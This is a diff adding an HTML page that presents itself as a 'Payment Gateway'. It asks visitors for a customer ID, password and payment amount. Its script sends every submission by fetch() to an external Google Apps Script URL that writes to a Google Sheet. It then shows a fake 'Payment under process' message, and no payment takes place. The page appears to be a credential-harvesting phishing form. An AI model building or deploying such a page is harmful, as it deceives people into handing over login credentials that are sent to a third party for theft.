@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width,inital-scale=1.0">
+	<title>Payment Gateway</title>
+
+</head>
+<body>
+	<div>
+	<table border>
+	<tr><th>
+	<img src="ccc.PNG" height="100" width="225">
+
+	<h3>Payment Gateway</h3>
+	<form name="submit-to-google-sheet">
+
+
+       <label></label>
+       <input type="text" name="Customer ID" required autofocus placeholder="Customer ID">
+       <br></br>
+       <label></label>
+       <input type="text" name="Password" required autofocus placeholder="Password">
+       <br></br>
+       <label></label>
+       <input type="text" name="Amount" required autofocus placeholder="Amount">
+       <br></br>
+       <input type="submit" value="              Pay now             "><br>
+       <span id=success></span>
+       </form>
+          <script>
+          const scriptURL = 'https://script.google.com/macros/s/AKfycbz3QkrYvULmpNlMsa5DsrnDFwDaljkr474b8jtKBAKgcH6oHz1VXxaCvZV1uc2GPWuZ/exec'
+          const form = document.forms['submit-to-google-sheet']
+          const success = document.getElementById('success');
+          form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => {
+            success.innerHTML= " Payment under process";
+
+            setTimeout(function() 
+            {
+              success.innerHTML="";
+            },5000)
+            form.reset()
+          })
+          .catch(error => console.error('Error!', error.message))
+          })
+     </script> 
+     <br>
+     <img src="Scree.jpg" height="240" width="210">  </th>
+   
+   
+   </table>
+</div>
+    
+</body>
+</html>
